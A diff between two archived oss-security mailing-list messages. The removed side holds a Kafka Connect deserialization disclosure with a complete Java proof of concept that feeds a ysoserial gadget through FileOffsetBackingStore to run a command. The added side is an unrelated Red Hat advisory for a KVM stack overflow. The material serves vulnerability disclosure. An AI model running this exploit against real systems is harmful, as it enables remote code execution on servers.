@@ -1,83 +1,34 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/19/4
-Message-ID: <20170719091513.7qubl5vw3a34jbvi@lorien.valinor.li>
-Date: Wed, 19 Jul 2017 11:15:13 +0200
-From: Salvatore Bonaccorso <carnil@...ian.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-IDs request for Apache Kafka desrialization vulnerability via runtime
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/12/17
+Message-ID: <nycvar.YSQ.7.76.1710122333130.10613@wniryva>
+Date: Thu, 12 Oct 2017 23:35:35 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+Subject: CVE-2017-12188 Kernel: KVM: MMU potential stack buffer overrun during page walks
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Jul 19, 2017 at 09:41:16AM +1000, Hooman Ghasem Broujerdi wrote:
-> Hi,
-> 
-> Apache kafka connect-api runtime contains a desrialization vul via
-> FileOffsetBackingStore
-> which leads to remote code execution, this can be exploited reliably in
-> JDK1.7.0_05, below is
-> a unit test for it:
-> 
-> 
-> import junit.framework.Test;
-> import junit.framework.TestCase;
-> import junit.framework.TestSuite;
-> import org.apache.commons.io.FileUtils;
-> import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
-> import org.apache.kafka.connect.storage.FileOffsetBackingStore;
-> import ysoserial.payloads.Jdk7u21;
-> 
-> import java.io.ByteArrayOutputStream;
-> import java.io.File;
-> import java.io.IOException;
-> import java.io.ObjectOutputStream;
-> import java.util.HashMap;
-> import java.util.Map;
-> 
-> public void test_Kafka_Deser() throws Exception {
-> 
->         StandaloneConfig config;
-> 
->         String projectDir = System.getProperty("user.dir");
-> 
->         Jdk7u21 jdk7u21 = new Jdk7u21();
->         Object o = jdk7u21.getObject("touch vul");
-> 
->         byte[] ser = serialize(o);
-> 
->         File tempFile = new File(projectDir + "/payload.ser");
->         FileUtils.writeByteArrayToFile(tempFile, ser);
-> 
->         Map<String, String> props = new HashMap<String, String>();
->         props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
-> tempFile.getAbsolutePath());
->         props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
-> "org.apache.kafka.connect.json.JsonConverter");
->         props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
-> "org.apache.kafka.connect.json.JsonConverter");
->         props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
-> "org.apache.kafka.connect.json.JsonConverter");
->         props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
-> "org.apache.kafka.connect.json.JsonConverter");
->         config = new StandaloneConfig(props);
-> 
->         FileOffsetBackingStore restore = new FileOffsetBackingStore();
->         restore.configure(config);
->         restore.start();
->     }
-> 
->     private byte[] serialize(Object object) throws IOException {
->         ByteArrayOutputStream bout = new ByteArrayOutputStream();
->         ObjectOutputStream out = new ObjectOutputStream(bout);
->         out.writeObject(object);
->         out.flush();
->         return bout.toByteArray();
->     }
+    Hello,
 
-Thanks for reaching out the oss-security list. Unfortunately direct
-CVE assignments cannot be request anymore through the list, rather
-please fill the form at https://cveform.mitre.org/
+Linux kernel built with the KVM virtualisation support(CONFIG_KVM), with 
+nested virtualisation(nVMX) feature enabled(nested=1), is vulnerable to a 
+stack buffer overflow issue. It could occur while traversing guest page table 
+entries to resolve guest virtual address(gva).
 
-Once you have the CVE assigned, can you please followup with the
-assignement in this thread, so that other are informed about it?
+A L1 guest could use this flaw to crash the host kernel resulting in DoS. OR 
+potentially execute arbitrary code on the host to gain access to the host 
+system.
 
-Regards,
-Salvatore
+Upstream patch:
+---------------
+   -> https://www.spinics.net/lists/kvm/msg156651.html
+
+Reference:
+----------
+   -> https://bugzilla.redhat.com/show_bug.cgi?id=1500380
+
+'CVE-2017-12188' assigned by Red Hat Inc.
+
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
